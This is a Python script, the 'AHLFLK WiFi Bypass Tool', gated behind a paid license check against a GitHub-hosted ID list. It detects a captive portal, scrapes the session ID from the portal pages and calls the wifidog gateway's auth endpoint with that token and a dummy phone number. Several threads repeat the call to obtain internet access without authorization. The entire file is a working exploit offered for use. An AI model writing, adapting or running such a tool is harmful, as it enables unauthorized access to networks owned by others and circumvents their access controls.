#!/usr/bin/env python

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import json
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# VIP CONFIGURATION (GITHUB)
# ===============================
# Replace this with your GitHub Raw JSON URL
JSON_URL = "YOUR_GITHUB_RAW_URL_HERE"
ID_FILE = ".id_key"

# ===============================
# CONFIG & COLORS
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

ORANGE = "\033[38;5;208m"
BOLD = "\033[1m"
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[0;33m"
MAGENTA = "\033[0;35m"
END = "\033[0m"
RESET = "\033[00m"

stop_event = threading.Event()

# ===============================
# HEADER & BANNER
# ===============================
def print_header(text):
    line = "═" * (len(text) + 4)
    print(f"\n{ORANGE}╔{line}╗")
    print(f"║  {BOLD}{text}{END}{ORANGE}  ║")
    print(f"╚{line}╝{END}")

def banner():
    print_header("AHLFLK WiFi Bypass Tool")

# ===============================
# GITHUB VIP SYSTEM
# ===============================
def get_fixed_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read().strip()
    else:
        new_id = f"AHLFLK_{random.randint(1000000, 9999999)}"
        with open(ID_FILE, "w") as f:
            f.write(new_id)
        return new_id

def check_vip():
    my_id = get_fixed_id()
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print_header("AHLFLK VIP LICENSE SYSTEM")
    print(f"{CYAN}YOUR ID : {RESET}{YELLOW}{my_id}{RESET}")
    print(f"{MAGENTA}Provide this ID to Admin for activation.{RESET}")
    print("-" * 50)
    
    print(f"{CYAN}[*] Verifying License via GitHub...{RESET}")
    
    try:
        response = requests.get(JSON_URL, timeout=10)
        vip_data = response.json()
        
        if my_id in vip_data:
            user_info = vip_data[my_id]
            if user_info.get("Status") == "ACTIVE":
                print(f"{GREEN}✅ ACCESS GRANTED!{RESET}")
                print(f"{BOLD}User    : {user_info.get('Name')}{RESET}")
                print(f"{BOLD}Expires : {user_info.get('Expiration')}{RESET}")
                print("-" * 50)
                time.sleep(2)
                return True
            else:
                print(f"{RED}❌ LICENSE EXPIRED OR DISABLED!{RESET}")
                return False
        else:
            print(f"{RED}❌ ACCESS DENIED!{RESET}")
            print(f"{ORANGE}Your ID is not in our VIP Database.{RESET}")
            return False
            
    except Exception as e:
        print(f"{RED}❌ Connection Error: Could not reach GitHub Server.{RESET}")
        return False

# ===============================
# INTERNET CHECK
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.ruijienetworks.com", timeout=3).status_code == 200
    except:
        return False

# ===============================
# HIGH SPEED PING THREAD
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    ping_count = 0
    success_count = 0

    while not stop_event.is_set():
        try:
            start = time.time()
            r = session.get(auth_link, timeout=5)
            elapsed = (time.time() - start) * 1000
            ping_count += 1
            success_count += 1
            print(f"✅ SID {sid} | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}", end="\r")
        except:
            ping_count += 1
            print(f"❌ SID {sid} | Error | Success: {success_count}/{ping_count}", end="\r")

        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

# ===============================
# MAIN PROCESS
# ===============================
def start_process():
    if not check_vip():
        input(f"\n{YELLOW}Press Enter to exit...{RESET}")
        return

    banner()
    logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"

        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"🔵 Internet Already Active... Waiting", end="\r")
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{CYAN}[*] Captive Portal Detected: {portal_host}{RESET}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                time.sleep(5); continue

            print(f"✅ Session ID Captured: {sid}")

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print_header("Launching Threads")
            for i in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            last_status = False
            while not stop_event.is_set():
                is_connected = check_real_internet()
                if is_connected and not last_status:
                    print(f"\n✅ Internet Connected!")
                last_status = is_connected
                time.sleep(2)

        except KeyboardInterrupt:
            raise
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n🛑 Shutdown...")
